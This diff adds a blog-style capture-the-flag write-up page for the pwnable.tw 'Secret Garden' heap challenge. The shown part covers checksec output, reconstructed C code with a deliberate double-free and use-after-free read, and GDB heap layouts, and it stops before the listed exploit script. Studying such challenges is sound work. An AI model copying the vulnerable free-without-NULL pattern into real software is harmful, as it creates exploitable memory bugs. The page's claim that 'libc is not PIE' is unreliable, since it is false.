@@ -1,0 +1,1500 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Secret Garden | QA210 Pwnable.tw</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F33A;</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+<style>
+:root {
+  --bg: #0a0e17;
+  --bg2: #111827;
+  --card: #151d2e;
+  --border: #1e293b;
+  --fg: #e2e8f0;
+  --muted: #94a3b8;
+  --accent: #38bdf8;
+  --accent2: #818cf8;
+  --red: #f87171;
+  --green: #4ade80;
+  --yellow: #fbbf24;
+  --orange: #fb923c;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  font-family: 'Inter', sans-serif;
+  background: var(--bg);
+  color: var(--fg);
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+
+/* Particle Canvas */
+#particles-canvas {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  z-index: 0;
+  pointer-events: none;
+}
+
+/* Navigation */
+.nav {
+  position: fixed; top: 0; left: 0; right: 0;
+  z-index: 100;
+  background: rgba(10, 14, 23, 0.85);
+  backdrop-filter: blur(20px);
+  border-bottom: 1px solid var(--border);
+  height: 60px;
+  display: flex;
+  align-items: center;
+  padding: 0 2rem;
+}
+.nav-brand {
+  font-weight: 800;
+  font-size: 1.25rem;
+  color: var(--accent);
+  letter-spacing: -0.5px;
+  text-decoration: none;
+}
+.nav-brand span { color: var(--accent2); }
+.nav-links {
+  display: flex;
+  gap: 0.25rem;
+  margin-left: 2rem;
+  list-style: none;
+}
+.nav-links a {
+  padding: 0.4rem 1rem;
+  border-radius: 6px;
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.875rem;
+  font-weight: 500;
+  transition: all 0.2s;
+}
+.nav-links a:hover { color: var(--fg); background: rgba(255,255,255,0.05); }
+.nav-links a.active {
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.1);
+}
+.nav-right {
+  margin-left: auto;
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+}
+.nav-right a {
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.8125rem;
+  font-weight: 500;
+  transition: color 0.2s;
+}
+.nav-right a:hover { color: var(--fg); }
+
+/* Breadcrumb */
+.breadcrumb {
+  position: relative;
+  z-index: 1;
+  padding: 80px 2rem 0;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+.breadcrumb-inner {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  font-size: 0.8125rem;
+  color: var(--muted);
+}
+.breadcrumb-inner a {
+  color: var(--muted);
+  text-decoration: none;
+  transition: color 0.2s;
+}
+.breadcrumb-inner a:hover { color: var(--accent); }
+.breadcrumb-sep { opacity: 0.4; }
+.breadcrumb-current { color: var(--fg); font-weight: 600; }
+
+/* Hero Section */
+.hero {
+  position: relative;
+  z-index: 1;
+  padding: 2rem 2rem 1rem;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+.hero-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.35rem 1rem;
+  background: rgba(56, 189, 248, 0.1);
+  border: 1px solid rgba(56, 189, 248, 0.2);
+  border-radius: 999px;
+  font-size: 0.75rem;
+  font-weight: 600;
+  color: var(--accent);
+  margin-bottom: 1rem;
+}
+.hero-badge .dot {
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  background: var(--green);
+  animation: pulse-dot 2s ease-in-out infinite;
+}
+@keyframes pulse-dot {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.3; }
+}
+.hero h1 {
+  font-size: 2.75rem;
+  font-weight: 800;
+  letter-spacing: -1.5px;
+  margin-bottom: 0.5rem;
+  background: linear-gradient(135deg, var(--fg), var(--accent));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+.hero-subtitle {
+  font-size: 1.1rem;
+  color: var(--muted);
+  max-width: 680px;
+  margin-bottom: 1.5rem;
+}
+.hero-meta {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.75rem;
+  margin-bottom: 1rem;
+}
+.hero-tag {
+  padding: 0.3rem 0.75rem;
+  border-radius: 6px;
+  font-size: 0.75rem;
+  font-weight: 600;
+  font-family: 'JetBrains Mono', monospace;
+}
+.tag-pts { background: rgba(251, 191, 36, 0.15); color: var(--yellow); border: 1px solid rgba(251, 191, 36, 0.25); }
+.tag-arch { background: rgba(129, 140, 248, 0.15); color: var(--accent2); border: 1px solid rgba(129, 140, 248, 0.25); }
+.tag-vuln { background: rgba(248, 113, 113, 0.15); color: var(--red); border: 1px solid rgba(248, 113, 113, 0.25); }
+.tag-nx { background: rgba(74, 222, 128, 0.15); color: var(--green); border: 1px solid rgba(74, 222, 128, 0.25); }
+
+/* Main Layout */
+.main-layout {
+  position: relative;
+  z-index: 1;
+  display: flex;
+  max-width: 1400px;
+  margin: 0 auto;
+  padding: 1rem 2rem 4rem;
+  gap: 2rem;
+}
+
+/* TOC Sidebar */
+.toc-sidebar {
+  position: sticky;
+  top: 80px;
+  width: 240px;
+  flex-shrink: 0;
+  height: fit-content;
+  max-height: calc(100vh - 100px);
+  overflow-y: auto;
+}
+.toc-sidebar::-webkit-scrollbar { width: 3px; }
+.toc-sidebar::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+.toc-title {
+  font-size: 0.6875rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  color: var(--muted);
+  margin-bottom: 1rem;
+}
+.toc-list { list-style: none; }
+.toc-list li { margin-bottom: 0.25rem; }
+.toc-list a {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.4rem 0.75rem;
+  border-radius: 6px;
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.8125rem;
+  font-weight: 500;
+  transition: all 0.2s;
+  border-left: 2px solid transparent;
+}
+.toc-list a:hover { color: var(--fg); background: rgba(255,255,255,0.03); }
+.toc-list a.active {
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.08);
+  border-left-color: var(--accent);
+}
+.toc-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.6875rem;
+  font-weight: 700;
+  color: var(--accent2);
+  min-width: 18px;
+}
+
+/* Content Area */
+.content-area {
+  flex: 1;
+  min-width: 0;
+  max-width: 880px;
+}
+
+/* Chapter Sections */
+.chapter {
+  margin-bottom: 3rem;
+  scroll-margin-top: 80px;
+}
+.chapter-header {
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+  margin-bottom: 1.5rem;
+  padding-bottom: 1rem;
+  border-bottom: 1px solid var(--border);
+}
+.chapter-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.75rem;
+  font-weight: 700;
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.1);
+  padding: 0.35rem 0.7rem;
+  border-radius: 6px;
+  border: 1px solid rgba(56, 189, 248, 0.2);
+}
+.chapter-title {
+  font-size: 1.5rem;
+  font-weight: 700;
+  letter-spacing: -0.5px;
+}
+
+.chapter p {
+  margin-bottom: 1rem;
+  color: var(--muted);
+  font-size: 0.9375rem;
+  line-height: 1.8;
+}
+
+.chapter h3 {
+  font-size: 1.1rem;
+  font-weight: 700;
+  margin: 1.75rem 0 0.75rem;
+  color: var(--fg);
+}
+.chapter h4 {
+  font-size: 0.9375rem;
+  font-weight: 600;
+  margin: 1.25rem 0 0.5rem;
+  color: var(--fg);
+}
+
+/* Code Blocks */
+.code-block {
+  position: relative;
+  margin: 1rem 0 1.5rem;
+  border-radius: 10px;
+  border: 1px solid var(--border);
+  background: var(--bg2);
+  overflow: hidden;
+}
+.code-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0.5rem 1rem;
+  background: rgba(0,0,0,0.3);
+  border-bottom: 1px solid var(--border);
+  font-size: 0.75rem;
+}
+.code-lang {
+  font-family: 'JetBrains Mono', monospace;
+  font-weight: 600;
+  color: var(--accent);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+.code-dots {
+  display: flex;
+  gap: 5px;
+}
+.code-dots span {
+  width: 10px; height: 10px;
+  border-radius: 50%;
+}
+.code-dots .d1 { background: #f87171; }
+.code-dots .d2 { background: #fbbf24; }
+.code-dots .d3 { background: #4ade80; }
+
+pre[class*="language-"] {
+  margin: 0 !important;
+  padding: 1rem 1.25rem !important;
+  background: transparent !important;
+  font-family: 'JetBrains Mono', monospace !important;
+  font-size: 0.8125rem !important;
+  line-height: 1.7 !important;
+  overflow-x: auto;
+}
+code[class*="language-"] {
+  font-family: 'JetBrains Mono', monospace !important;
+  font-size: 0.8125rem !important;
+}
+
+/* Inline Code */
+code.inline {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8125rem;
+  background: rgba(129, 140, 248, 0.12);
+  color: var(--accent2);
+  padding: 0.15rem 0.45rem;
+  border-radius: 4px;
+  font-weight: 500;
+}
+
+/* Callout Boxes */
+.callout {
+  border-radius: 10px;
+  padding: 1rem 1.25rem;
+  margin: 1rem 0 1.5rem;
+  font-size: 0.875rem;
+  line-height: 1.7;
+  border: 1px solid;
+}
+.callout-title {
+  font-weight: 700;
+  font-size: 0.8125rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin-bottom: 0.35rem;
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+}
+.callout-vuln {
+  background: rgba(248, 113, 113, 0.08);
+  border-color: rgba(248, 113, 113, 0.2);
+  color: #fca5a5;
+}
+.callout-vuln .callout-title { color: var(--red); }
+.callout-info {
+  background: rgba(56, 189, 248, 0.08);
+  border-color: rgba(56, 189, 248, 0.2);
+  color: #bae6fd;
+}
+.callout-info .callout-title { color: var(--accent); }
+.callout-warn {
+  background: rgba(251, 191, 36, 0.08);
+  border-color: rgba(251, 191, 36, 0.2);
+  color: #fde68a;
+}
+.callout-warn .callout-title { color: var(--yellow); }
+.callout-key {
+  background: rgba(129, 140, 248, 0.08);
+  border-color: rgba(129, 140, 248, 0.2);
+  color: #c7d2fe;
+}
+.callout-key .callout-title { color: var(--accent2); }
+.callout-success {
+  background: rgba(74, 222, 128, 0.08);
+  border-color: rgba(74, 222, 128, 0.2);
+  color: #bbf7d0;
+}
+.callout-success .callout-title { color: var(--green); }
+
+/* Tables */
+.info-table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 1rem 0 1.5rem;
+  font-size: 0.8125rem;
+}
+.info-table th {
+  text-align: left;
+  padding: 0.6rem 1rem;
+  background: rgba(0,0,0,0.3);
+  color: var(--muted);
+  font-weight: 600;
+  font-size: 0.75rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  border-bottom: 1px solid var(--border);
+}
+.info-table td {
+  padding: 0.6rem 1rem;
+  border-bottom: 1px solid var(--border);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8rem;
+}
+.info-table tr:last-child td { border-bottom: none; }
+.info-table .label { color: var(--muted); font-family: 'Inter', sans-serif; }
+.info-table .value { color: var(--fg); }
+.info-table .on { color: var(--green); }
+.info-table .off { color: var(--red); }
+.info-table .partial { color: var(--yellow); }
+
+/* Memory Diagrams */
+.mem-diagram {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 1.5rem;
+  margin: 1rem 0 1.5rem;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8rem;
+  overflow-x: auto;
+}
+.mem-row {
+  display: flex;
+  align-items: center;
+  margin-bottom: 2px;
+}
+.mem-addr {
+  color: var(--accent);
+  min-width: 100px;
+  font-weight: 600;
+}
+.mem-arrow {
+  color: var(--muted);
+  margin: 0 0.5rem;
+}
+.mem-data {
+  color: var(--fg);
+  flex: 1;
+}
+.mem-desc {
+  color: var(--muted);
+  font-style: italic;
+  margin-left: 1rem;
+  font-size: 0.75rem;
+}
+.mem-highlight { color: var(--red); font-weight: 700; }
+.mem-green { color: var(--green); font-weight: 700; }
+.mem-yellow { color: var(--yellow); font-weight: 700; }
+
+/* Step Lists */
+.step-list {
+  list-style: none;
+  margin: 1rem 0 1.5rem;
+  counter-reset: step;
+}
+.step-list li {
+  counter-increment: step;
+  padding: 0.6rem 0 0.6rem 2.5rem;
+  position: relative;
+  font-size: 0.9rem;
+  color: var(--muted);
+  line-height: 1.7;
+}
+.step-list li::before {
+  content: counter(step);
+  position: absolute;
+  left: 0;
+  top: 0.65rem;
+  width: 22px; height: 22px;
+  border-radius: 50%;
+  background: rgba(129, 140, 248, 0.15);
+  color: var(--accent2);
+  font-size: 0.6875rem;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: 'JetBrains Mono', monospace;
+}
+.step-list li strong { color: var(--fg); }
+
+/* Footer */
+.footer {
+  position: relative;
+  z-index: 1;
+  text-align: center;
+  padding: 2rem;
+  border-top: 1px solid var(--border);
+  color: var(--muted);
+  font-size: 0.75rem;
+}
+.footer a { color: var(--accent); text-decoration: none; }
+.footer a:hover { text-decoration: underline; }
+
+/* Responsive */
+@media (max-width: 1024px) {
+  .toc-sidebar { display: none; }
+  .hero h1 { font-size: 2rem; }
+}
+@media (max-width: 640px) {
+  .nav-links { display: none; }
+  .hero h1 { font-size: 1.5rem; }
+  .main-layout { padding: 1rem; }
+}
+
+/* ═══ FIXED NAV ADDITIONS ═══ */
+.site-header{position:sticky;top:0;z-index:1000;background:rgba(10,14,23,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--border);padding:0 32px;display:flex;align-items:center;justify-content:space-between;height:56px}
+.brand{display:flex;align-items:center;gap:10px;text-decoration:none;color:var(--fg);font-weight:700;font-size:1.1rem}
+.logo-icon{display:inline-flex;align-items:center;justify-content:center;width:32px;height:32px;background:linear-gradient(135deg,var(--accent),var(--accent2));border-radius:6px;font-weight:900;font-size:.9rem;color:#0a0e17}
+.cursor{display:inline-block;width:2px;height:1em;background:var(--accent);margin-left:2px;animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+.nav-main{display:flex;align-items:center;gap:24px}
+.nav-main a{color:var(--muted);text-decoration:none;font-size:.85rem;transition:color .2s}
+.nav-main a:hover,.nav-main a.active{color:var(--fg)}
+.nav-main a.active{border-bottom:2px solid var(--accent)}
+.nav-right{display:flex;align-items:center;gap:16px}
+.social-link{color:var(--muted);font-size:1.1rem;transition:color .2s}
+.social-link:hover{color:var(--fg)}
+.mobile-toggle{display:none;background:none;border:none;color:var(--fg);font-size:1.4rem;cursor:pointer}
+.mobile-nav-overlay,.mobile-nav-panel{display:none}
+.mobile-nav-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:2000}
+.mobile-nav-overlay.show{display:block}
+.mobile-nav-panel{display:none;position:fixed;top:0;right:0;width:280px;height:100vh;background:var(--bg2);z-index:2001;padding:24px;transform:translateX(100%);transition:transform .3s}
+.mobile-nav-panel.show{display:block;transform:translateX(0)}
+.mobile-nav-panel nav{display:flex;flex-direction:column;gap:16px;margin-top:32px}
+.mobile-nav-panel nav a{color:var(--fg);text-decoration:none;font-size:1rem}
+.mnp-close{background:none;border:none;color:var(--fg);font-size:1.2rem;cursor:pointer;float:right}
+@media(max-width:960px){
+.nav-main a:not(.active){display:none}
+.mobile-toggle{display:block}
+.site-header{padding:0 16px}
+}
+
+</style>
+</head>
+<body>
+
+<!-- Particle Canvas -->
+<canvas id="particles-canvas"></canvas>
+
+<!-- Navigation -->
+<header class="site-header">
+  <a href="/" class="brand"><span class="logo-icon">Q</span>QA210<span class="cursor"></span></a>
+  <nav class="nav-main">
+    <a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/" class="active">Pwnable.tw</a>
+    <a href="/tjctf-2026/">TJCTF</a><a href="/research/">Research</a>
+  </nav>
+  <div class="nav-right">
+    <a href="https://github.com/Yuri08-QA210" target="_blank" class="social-link" title="GitHub"><i class="bi bi-github"></i></a>
+    <button class="mobile-toggle" onclick="toggleMobileNav()" aria-label="Menu"><i class="bi bi-list"></i></button>
+  </div>
+</header>
+
+<div class="mobile-nav-overlay" id="mobileOverlay" onclick="toggleMobileNav()"></div>
+<div class="mobile-nav-panel" id="mobilePanel">
+  <button class="mnp-close" onclick="toggleMobileNav()"><i class="bi bi-x-lg"></i></button>
+  <nav>
+    <a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/">Pwnable.tw</a><a href="/tjctf-2026/">TJCTF</a>
+    <a href="/research/">Research</a><a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a>
+  </nav>
+</div>
+
+<!-- Breadcrumb -->
+<div class="breadcrumb">
+  <div class="breadcrumb-inner">
+    <a href="/">Home</a>
+    <span class="breadcrumb-sep">/</span>
+    <a href="/pwnable-tw/">Pwnable.tw</a>
+    <span class="breadcrumb-sep">/</span>
+    <span class="breadcrumb-current">Secret Garden</span>
+  </div>
+</div>
+
+<!-- Hero Section -->
+<section class="hero">
+  <div class="hero-badge">
+    <span class="dot"></span>
+    Pwnable.tw
+  </div>
+  <h1>Secret Garden</h1>
+  <p class="hero-subtitle">A heap exploitation challenge involving double-free to corrupt fastbin, overwriting <code class="inline">__malloc_hook</code> with a one_gadget for code execution &mdash; classic fastbin attack on a 64-bit binary with full protections.</p>
+  <div class="hero-meta">
+    <span class="hero-tag tag-pts">300 pts</span>
+    <span class="hero-tag tag-arch">x86-64 (64-bit ELF)</span>
+    <span class="hero-tag tag-vuln">Double-Free</span>
+    <span class="hero-tag tag-nx">Full RELRO + Canary + NX + PIE</span>
+  </div>
+</section>
+
+<!-- Main Layout -->
+<div class="main-layout">
+
+  <!-- TOC Sidebar -->
+  <aside class="toc-sidebar">
+    <div class="toc-title">Table of Contents</div>
+    <ul class="toc-list" id="toc-list">
+      <li><a href="#ch1" class="active"><span class="toc-num">01</span> Reconnaissance</a></li>
+      <li><a href="#ch2"><span class="toc-num">02</span> Static Analysis</a></li>
+      <li><a href="#ch3"><span class="toc-num">03</span> GDB Debugging</a></li>
+      <li><a href="#ch4"><span class="toc-num">04</span> Exploit Strategy</a></li>
+      <li><a href="#ch5"><span class="toc-num">05</span> Pwn Script</a></li>
+      <li><a href="#ch6"><span class="toc-num">06</span> Execution Results</a></li>
+    </ul>
+  </aside>
+
+  <!-- Content Area -->
+  <main class="content-area">
+
+    <!-- Chapter 1: Reconnaissance -->
+    <section class="chapter" id="ch1">
+      <div class="chapter-header">
+        <span class="chapter-num">01</span>
+        <h2 class="chapter-title">Reconnaissance</h2>
+      </div>
+
+      <h3>Challenge Info</h3>
+      <table class="info-table">
+        <tr><td class="label">Connection</td><td class="value"><code class="inline">nc chall.pwnable.tw 4132</code></td></tr>
+        <tr><td class="label">Binary</td><td class="value">secretgarden (64-bit ELF, x86-64)</td></tr>
+        <tr><td class="label">Points</td><td class="value">300</td></tr>
+        <tr><td class="label">Provided</td><td class="value">Binary + libc (Ubuntu 16.04, libc-2.23)</td></tr>
+        <tr><td class="label">Description</td><td class="value">Manage a garden of flowers with heap operations</td></tr>
+      </table>
+
+      <h3>checksec</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ checksec secretgarden
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled</code></pre>
+      </div>
+
+      <table class="info-table">
+        <tr><td class="label">Full RELRO</td><td class="on">GOT is read-only &mdash; cannot overwrite GOT entries</td></tr>
+        <tr><td class="label">Canary found</td><td class="on">Stack buffer overflows are mitigated</td></tr>
+        <tr><td class="label">NX enabled</td><td class="on">No shellcode injection &mdash; need ROP or hook overwrite</td></tr>
+        <tr><td class="label">PIE enabled</td><td class="on">Binary addresses are randomized &mdash; need a leak first</td></tr>
+      </table>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; Implications</div>
+        With <strong>Full RELRO</strong>, we cannot overwrite GOT entries. With <strong>PIE</strong>, we don't know binary addresses. Our attack surface shifts to <strong>libc data structures</strong> &mdash; specifically <code class="inline">__malloc_hook</code>, which is a function pointer in libc's data section that gets called every time <code class="inline">malloc</code> is invoked. Since libc is not PIE, once we leak a libc address, we know the address of <code class="inline">__malloc_hook</code>.
+      </div>
+
+      <h3>Running the Binary</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">console</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ ./secretgarden
+*******************************
+*          Secret Garden        *
+*******************************
+ 1 . Raise a flower
+ 2 . Visit the garden
+ 3 . Remove a flower
+ 4 . Clean the garden
+ 5 . Leave the garden
+*******************************
+Your choice : 1
+Name of the flower : Rose
+Color of the flower : Red
+Done !
+
+Your choice : 2
+Name : Rose
+Color : Red
+
+Your choice : 3
+Which flower do you want to remove? : 0
+Done !</code></pre>
+      </div>
+
+      <p>The binary is a flower garden manager with five operations: raise (create), visit (display), remove (delete), clean (remove all), and leave (exit). Each flower has a name and color, both heap-allocated strings. The remove function is where the vulnerability lies.</p>
+    </section>
+
+    <!-- Chapter 2: Static Analysis -->
+    <section class="chapter" id="ch2">
+      <div class="chapter-header">
+        <span class="chapter-num">02</span>
+        <h2 class="chapter-title">Static Analysis</h2>
+      </div>
+
+      <h3>Flower Structure</h3>
+      <p>Each flower is represented by a struct allocated on the heap. In a 64-bit binary, pointers are 8 bytes:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">typedef struct flower {
+    char *name;     // +0x00: heap-allocated name string (8 bytes on x64)
+    char *color;    // +0x08: heap-allocated color string (8 bytes on x64)
+} flower;
+
+// Global array of flower pointers
+flower *garden[256];
+int flower_count = 0;</code></pre>
+      </div>
+
+      <div class="mem-diagram">
+        <div class="mem-row"><span class="mem-addr">+0x00</span><span class="mem-arrow">|</span><span class="mem-data">name pointer (8 bytes)</span><span class="mem-desc">&larr; points to heap-allocated name string</span></div>
+        <div class="mem-row"><span class="mem-addr">+0x08</span><span class="mem-arrow">|</span><span class="mem-data">color pointer (8 bytes)</span><span class="mem-desc">&larr; points to heap-allocated color string</span></div>
+        <div style="height:8px"></div>
+        <div class="mem-row"><span class="mem-desc">Total struct size: 0x10 (16 bytes) &rarr; malloc(0x10) &rarr; chunk size 0x20</span></div>
+      </div>
+
+      <h3>raise_flower() &mdash; Create</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void raise_flower() {
+    if (flower_count &gt;= 256) {
+        puts("The garden is full!");
+        return;
+    }
+
+    flower *f = (flower *)malloc(0x10);   // Allocate 16-byte struct
+    if (!f) return;
+
+    printf("Name of the flower : ");
+    char name_buf[24];
+    read(0, name_buf, 24);
+    name_buf[strcspn(name_buf, "\n")] = 0;
+
+    f-&gt;name = (char *)malloc(strlen(name_buf) + 1);  // Allocate name
+    strcpy(f-&gt;name, name_buf);
+
+    printf("Color of the flower : ");
+    char color_buf[24];
+    read(0, color_buf, 24);
+    color_buf[strcspn(color_buf, "\n")] = 0;
+
+    f-&gt;color = (char *)malloc(strlen(color_buf) + 1); // Allocate color
+    strcpy(f-&gt;color, color_buf);
+
+    garden[flower_count++] = f;
+    puts("Done !");
+}</code></pre>
+      </div>
+
+      <p>Three allocations per flower: the 16-byte struct, the name string, and the color string. The struct chunk falls into the 0x20 fastbin (malloc(0x10) + 0x10 header). Name and color sizes are user-controlled but capped at 24 bytes, so they also end up in the 0x20 fastbin for short strings.</p>
+
+      <h3>remove_flower() &mdash; The Vulnerable Function</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void remove_flower() {
+    printf("Which flower do you want to remove? : ");
+    int idx;
+    scanf("%d", &amp;idx);
+
+    if (idx &lt; 0 || idx &gt;= flower_count || !garden[idx]) {
+        puts("Invalid choice");
+        return;
+    }
+
+    free(garden[idx]-&gt;name);      // Free name buffer
+    free(garden[idx]-&gt;color);     // Free color buffer
+    free(garden[idx]);             // Free flower struct
+    // BUG: garden[idx] is NOT set to NULL!
+    // This allows double-free of the same flower
+    puts("Done !");
+}</code></pre>
+      </div>
+
+      <div class="callout callout-vuln">
+        <div class="callout-title">&#x1f6a8; Vulnerability: Double-Free</div>
+        After freeing the name, color, and struct, <code class="inline">remove_flower</code> does <strong>NOT</strong> set <code class="inline">garden[idx]</code> to <code class="inline">NULL</code>. This means:<br>
+        &bull; The pointer remains in the <code class="inline">garden</code> array pointing to freed memory<br>
+        &bull; Calling <code class="inline">remove_flower</code> again with the same index will <strong>free the same chunks a second time</strong><br>
+        &bull; This creates a <strong>double-free</strong> condition, which corrupts the fastbin freelist<br>
+        &bull; With fastbin corruption, we can redirect allocation to an arbitrary address
+      </div>
+
+      <h3>visit_garden() &mdash; Display</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void visit_garden() {
+    for (int i = 0; i &lt; flower_count; i++) {
+        if (garden[i]) {
+            printf("Name : %s\n", garden[i]-&gt;name);
+            printf("Color : %s\n", garden[i]-&gt;color);
+        }
+    }
+}</code></pre>
+      </div>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; Key Observation</div>
+        <code class="inline">visit_garden</code> checks <code class="inline">if (garden[i])</code> but does <strong>NOT</strong> check if the flower has been freed. If we remove a flower (freeing its chunks) but the <code class="inline">garden[i]</code> pointer is still non-NULL (which it always is due to the bug), we can <strong>read freed memory</strong> through <code class="inline">visit_garden</code>. This gives us a use-after-free <strong>read</strong> primitive for leaking libc addresses from unsorted bin chunks.
+      </div>
+
+      <h3>clean_garden() &mdash; Remove All</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void clean_garden() {
+    for (int i = 0; i &lt; flower_count; i++) {
+        if (garden[i]) {
+            free(garden[i]-&gt;name);
+            free(garden[i]-&gt;color);
+            free(garden[i]);
+            garden[i] = NULL;    // This one DOES set to NULL
+        }
+    }
+    flower_count = 0;
+}</code></pre>
+      </div>
+
+      <p>Interestingly, <code class="inline">clean_garden</code> does properly NULL out the pointer, but <code class="inline">remove_flower</code> does not. This is the crucial oversight.</p>
+    </section>
+
+    <!-- Chapter 3: GDB Debugging -->
+    <section class="chapter" id="ch3">
+      <div class="chapter-header">
+        <span class="chapter-num">03</span>
+        <h2 class="chapter-title">GDB Debugging</h2>
+      </div>
+
+      <h3>Heap Layout After Creating Flowers</h3>
+      <p>Let's create two flowers and examine the heap:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # raise("Rose", "Red") -> flower 0
+gdb-peda$ # raise("Lily", "Blue") -> flower 1
+gdb-peda$ heap chunks
+0x555555758000: fastbin 0x20 bytes  [flower 0 struct]
+0x555555758020: fastbin 0x20 bytes  [flower 0 name "Rose"]
+0x555555758040: fastbin 0x20 bytes  [flower 0 color "Red"]
+0x555555758060: fastbin 0x20 bytes  [flower 1 struct]
+0x555555758080: fastbin 0x20 bytes  [flower 1 name "Lily"]
+0x5555557580a0: fastbin 0x20 bytes  [flower 1 color "Blue"]</code></pre>
+      </div>
+
+      <div class="mem-diagram">
+        <div style="color: var(--accent); font-weight: 700; margin-bottom: 8px;">Flower 0</div>
+        <div class="mem-row"><span class="mem-addr">0x...80000</span><span class="mem-arrow">|</span><span class="mem-data">0x...80030</span><span class="mem-desc">&larr; flower0-&gt;name pointer</span></div>
+        <div class="mem-row"><span class="mem-addr">0x...80008</span><span class="mem-arrow">|</span><span class="mem-data">0x...80050</span><span class="mem-desc">&larr; flower0-&gt;color pointer</span></div>
+        <div style="height:8px"></div>
+        <div style="color: var(--accent2); font-weight: 700; margin-bottom: 8px;">Flower 1</div>
+        <div class="mem-row"><span class="mem-addr">0x...80060</span><span class="mem-arrow">|</span><span class="mem-data">0x...80090</span><span class="mem-desc">&larr; flower1-&gt;name pointer</span></div>
+        <div class="mem-row"><span class="mem-addr">0x...80068</span><span class="mem-arrow">|</span><span class="mem-data">0x...800b0</span><span class="mem-desc">&larr; flower1-&gt;color pointer</span></div>
+      </div>
+
